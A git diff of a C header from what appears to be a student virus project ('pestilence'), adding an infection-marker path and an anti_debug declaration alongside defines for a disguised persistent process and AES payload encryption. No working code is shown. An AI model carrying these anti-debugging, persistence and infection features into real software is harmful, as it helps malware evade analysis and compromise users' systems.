@@ -6,7 +6,7 @@
 /*   By: plamtenz <plamtenz@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2020/02/29 20:08:14 by plamtenz          #+#    #+#             */
-/*   Updated: 2020/02/29 21:30:15 by plamtenz         ###   ########.fr       */
+/*   Updated: 2020/02/29 22:23:16 by plamtenz         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -51,6 +51,8 @@
 # include <sys/ptrace.h>
 # include <sys/mman.h>
 
+#define DEAMON_INFECTION_PATH               "tmp/yeah_dude_ur_infected"
+
 /*
 **
 **      --> AES ENCRYPTATION / DECRYPTATION
@@ -93,7 +95,6 @@ typedef struct                      s_atp
     char                            pestilence;
 }                                   t_atp;
 
-#define PERSISTENT_TRACER_CHECKER   "to write here encrypted hexdump code"
 #define PTC_NAME                    "tmp/trace_me_if_u_can" // path
 #define PROCESS_ATP                 {".trace_me_if_u_can", NULL} // process: persistent process name
 
@@ -155,5 +156,12 @@ char                                **get_cmd_lines(char **files, char *dir_path
 char                                *read_file_data(int fd, size_t size);
 char                                *get_file_data(const char *filename);
 char                                *get_file_base_name(const char *path);
+
+/*
+**
+**      --> MAIN FUNCTION
+**
+*/
+t_aes                               *anti_debug(char **env, t_atp *atp);
 
 #endif
